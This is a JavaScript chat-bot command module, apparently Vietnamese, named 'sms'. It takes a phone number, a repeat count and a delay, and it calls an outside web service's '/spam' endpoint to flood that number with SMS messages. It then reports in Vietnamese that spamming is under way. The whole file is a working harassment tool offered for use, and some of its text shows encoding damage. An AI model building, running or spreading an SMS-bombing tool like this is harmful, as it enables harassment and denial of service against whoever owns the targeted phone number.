import axios from "axios";

const config = {
  name: "sms",
  version: "0.0",
  description: "",
  permissions: [2],
  cooldown: 5
}

async function Running({ message, args, data }) {
  const user = data.user
  const input = args.join(" ").split("|")
  const sdt = input[0],
    luot = input[1],
    delay = input[2]

  if (!sdt || !luot || !delay) return message.reply("Thi?u d? li?u, vui lòng nh?p l?i!");

  axios.get(encodeURI(`https://nguyendinhtiendung.io.vn/spam?sdt=${sdt}&luot=${luot}&delay=${delay}`));

  return message.send(`Ðang ti?n hành spam\n\nS? di?n tho?i: ${sdt}\n\nS? l?n: ${luot}\n\nTime delay: ${delay}\n\nNgu?i th?c thi l?nh: ${user.info.name}`)
}

export {
  config,
  Running
}